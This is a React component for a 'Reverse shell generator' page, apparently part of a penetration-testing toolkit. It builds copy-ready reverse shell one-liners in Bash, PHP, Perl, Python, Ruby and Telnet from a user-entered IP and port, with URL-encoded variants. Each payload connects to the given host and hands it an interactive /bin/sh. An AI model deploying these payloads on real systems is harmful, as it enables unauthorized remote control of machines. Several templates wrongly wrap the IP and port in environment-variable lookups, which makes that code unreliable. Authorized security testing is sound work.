import React, { useState } from "react";
import { Button, message, Typography, Row, Col, Divider } from "antd";
import {
  CopyOutlined,
  WifiOutlined,
  LinkOutlined,
  createFromIconfontCN,
} from "@ant-design/icons";
import MaskedInput from "antd-mask-input";
import QueueAnim from "rc-queue-anim";
import Clipboard from "react-clipboard.js";

const { Title, Paragraph } = Typography;
const IconFont = createFromIconfontCN({
  scriptUrl: ["./iconfont.js"],
});

export default (props) => {
  const [values, setValues] = useState({
    ip: "",
    port: "",
  });
  const handleChange = (name) => (event) => {
    setValues({ ...values, [name]: event.target.value });
  };
  const successInfoReverseShell = () => {
    message.success("Your reverse shell has been copied");
  };
  const successInfoEncodeURL = () => {
    message.success("Reverse shell URI encoded has been copied");
  };
  const bash_rshell = `bash -c 'exec bash -i &>/dev/tcp/${values.ip}/${values.port} <&1'`;
  const php_rshell = `php -r '$sock=fsockopen(getenv("${values.ip}"),getenv("${values.port}"));exec("/bin/sh -i <&3 >&3 2>&3");'`;
  const perl_rshell = `perl -e 'use Socket;$i="$ENV{${values.ip}}";$p=$ENV{${values.port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
  const python_rshell = `python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("${values.ip}"),int(os.getenv("${values.port}"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'`;
  const ruby_rshell = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["${values.ip}"],ENV["${values.port}"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
  const telnet_rshell = `TF=$(mktemp -u);
  mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | /bin/sh 1>$TF
  `;
  return (
    <QueueAnim delay={300} duration={1000}>
      <Title
        variant='Title level={3}'
        style={{ fontWeight: "bold", margin: 15 }}
      >
        Reverse shell
      </Title>
      <Paragraph style={{ margin: 15 }}>Reverse shell generator</Paragraph>
      <div style={{ padding: 15 }}>
        <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
          <Col span={12}>
            <MaskedInput
              prefix={<WifiOutlined />}
              mask='111.111.111.111'
              name='Ip adress'
              placeholderChar=' '
              placeholder='IP Address (ex: 212.212.111.222)'
              onChange={handleChange("ip")}
            />
          </Col>
          <Col span={12}>
            <MaskedInput
              placeholderChar=' '
              prefix={
                <svg
                  t='1592848067245'
                  class='iconfont'
                  viewBox='0 0 1024 1024'
                  version='1.1'
                  xmlns='http://www.w3.org/2000/svg'
                  p-id='5009'
                  width='15'
                  height='15'
                >
                  <path
                    d='M170.666667 640H106.666667a21.333333 21.333333 0 0 1-21.333334-21.333333v-426.666667a21.333333 21.333333 0 0 1 21.333334-21.333333h768a21.333333 21.333333 0 0 1 21.333333 21.333333v426.666667a21.333333 21.333333 0 0 1-21.333333 21.333333H810.666667v64a21.333333 21.333333 0 0 1-21.333334 21.333333H725.333333v64a21.333333 21.333333 0 0 1-21.333333 21.333334h-426.666667a21.333333 21.333333 0 0 1-21.333333-21.333334V725.333333H192a21.333333 21.333333 0 0 1-21.333333-21.333333V640zM128 213.333333v384h64a21.333333 21.333333 0 0 1 21.333333 21.333334V682.666667h64a21.333333 21.333333 0 0 1 21.333334 21.333333V768h384v-64a21.333333 21.333333 0 0 1 21.333333-21.333333H768v-64a21.333333 21.333333 0 0 1 21.333333-21.333334H853.333333V213.333333H128z m469.333333 64a21.333333 21.333333 0 1 1 42.666667 0v85.333334a21.333333 21.333333 0 1 1-42.666667 0v-85.333334z m85.333334 0a21.333333 21.333333 0 1 1 42.666666 0v85.333334a21.333333 21.333333 0 1 1-42.666666 0v-85.333334z m-170.666667 0a21.333333 21.333333 0 1 1 42.666667 0v85.333334a21.333333 21.333333 0 1 1-42.666667 0v-85.333334z m-85.333333 0a21.333333 21.333333 0 1 1 42.666666 0v85.333334a21.333333 21.333333 0 1 1-42.666666 0v-85.333334z m-85.333334 0a21.333333 21.333333 0 0 1 42.666667 0v85.333334a21.333333 21.333333 0 0 1-42.666667 0v-85.333334z m-85.333333 0a21.333333 21.333333 0 0 1 42.666667 0v85.333334a21.333333 21.333333 0 0 1-42.666667 0v-85.333334z'
                    fill='#000000'
                    p-id='5010'
                  />
                </svg>
              }
              mask='1111'
              name='Port'
              placeholder='Port (ex: 1337)'
              onChange={handleChange("port")}
            />
          </Col>
        </Row>
      </div>
      <Divider dashed />
      <div style={{ padding: 10, marginTop: 15 }} key='a'>
        <Title level={3}>
          Bash <IconFont type='icon-gnubash' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {bash_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={bash_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined /> Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(bash_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='b'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          PHP <IconFont type='icon-php' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {php_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={php_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(php_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='c'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Perl <IconFont type='icon-perl' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {perl_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={perl_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(perl_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='d'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Python <IconFont type='icon-python' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {" "}
          {python_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={python_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(python_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div
        key='e'
        style={{
          padding: 15,
          marginTop: 15,
        }}
      >
        <Title level={3}>
          Ruby <IconFont type='icon-ruby' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {ruby_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={ruby_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(ruby_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
      <Divider dashed />
      <div style={{ padding: 15, marginTop: 15 }} key='f'>
        <Title level={3}>
          Telnet <IconFont type='icon-lvzhou_yuanchengTelnet' />
        </Title>
        <Paragraph copyable ellipsis={true}>
          {telnet_rshell}
        </Paragraph>
        <Clipboard component='a' data-clipboard-text={telnet_rshell}>
          <Button
            type='primary'
            onClick={successInfoReverseShell}
            style={{ marginBottom: 10, marginTop: 15 }}
          >
            <CopyOutlined />
            Copy the reverse shell
          </Button>
        </Clipboard>
        <Clipboard component='a' data-clipboard-text={encodeURI(telnet_rshell)}>
          <Button
            onClick={successInfoEncodeURL}
            style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
          >
            <LinkOutlined /> URL encoded
          </Button>
        </Clipboard>
      </div>
    </QueueAnim>
  );
};
